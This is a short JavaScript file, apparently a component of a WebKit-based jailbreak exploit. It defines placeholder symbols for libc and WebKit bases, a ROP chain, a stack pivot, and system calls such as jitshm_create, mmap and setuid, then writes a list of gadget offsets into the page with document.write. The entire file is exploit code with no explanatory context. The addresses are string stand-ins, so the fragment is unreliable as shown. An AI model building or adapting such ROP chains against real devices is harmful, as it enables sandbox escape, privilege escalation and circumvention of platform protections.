function jb(){

var libc_base="libc_base+";
var ropchain="ropchain+";
var main_ret="main_ret";
var webkit_base="webkit_base+";
var socket_addr="socket_addr";
var pivot_addr="pivot_addr";
var printf_buf = "printf_buf";
var __swbuf_addr = "__swbuf_addr";
var jop_frame_addr="jop_frame_addr";
var mmap_addr="mmap_addr";
var pthread_create_addr="pthread_create_addr";
var write_addr="write_addr";
var getsockopt_addr="getsockopt_addr";
var setsockopt_addr="setsockopt_addr";
var nanosleep_addr="nanosleep_addr";
var kevent_addr="kevent_addr";
var close_addr="close_addr";
var fork_addr="fork_addr";
var getpid_addr="getpid_addr";
var kqueue_addr="kqueue_addr";
var jitshm_create_addr="jitshm_create_addr";
var jitshm_alias_addr="jitshm_alias_addr";
var sigaction_addr="sigaction_addr";
var get_errno_addr_addr="get_errno_addr_addr";
var setuid_addr="setuid_addr";
function writeptr(l){
	var lis=[];
for(var i = 0; i < l.length; i++){
	lis.push(l[i]);
	if((i!=0 && i%1000 == 0) || i==l.length-1){
		printt(lis);
		lis=[];
	}
}
}
function printt(li){
	document.write("writeptr([");
for(var i = 0; i < li.length; i++){
	if(typeof li[i]=="object"){
	document.write("["+li[i]+"],");
}else{
document.write(li[i]+",");}
}
document.write("]);<br>");}
writeptr([libc_base+788575,ropchain+65720,webkit_base+14461559,libc_base+206806,ropchain+65680,libc_base+793877,[8, 0, 0, 0, 0, 0, 0, 0],libc_base+248252,libc_base+788575,ropchain+112,libc_base+471355,libc_base+811575,ropchain+815552,libc_base+811575,ropchain+65680]);
var printf_buf_offset = 128;
writeptr([printf_buf,[255, 255, 255, 255, 255, 255, 255, 255]]);
ropchain_ptr=65680;

}